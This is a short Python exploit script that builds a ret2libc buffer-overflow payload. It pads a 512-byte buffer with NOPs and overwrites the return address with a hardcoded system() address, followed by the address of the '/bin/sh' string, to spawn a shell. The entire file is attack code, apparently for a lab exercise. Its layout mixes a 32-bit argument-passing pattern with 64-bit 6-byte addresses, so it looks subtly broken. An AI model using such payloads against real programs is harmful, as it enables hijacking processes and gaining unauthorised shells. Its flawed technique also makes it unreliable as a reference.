#!/usr/bin/python

import struct
import sys

buffsize = 512
offset = 0

#system(): 0x7ffff7e1d120
#exit(): 0x7ffff7e12820
#"/bin/sh": 0x7ffff7f5f966

padding = b'\x90'*(buffsize)
ebp = b'\x90'*8
eip = b'\x20\xd1\xe1\xf7\xff\x7f'
garbage = b'\x90'*8
string = b'\x66\xf9\xf5\xf7\xff\x7f'

sys.stdout.buffer.write(padding+ebp+eip+garbage+string)
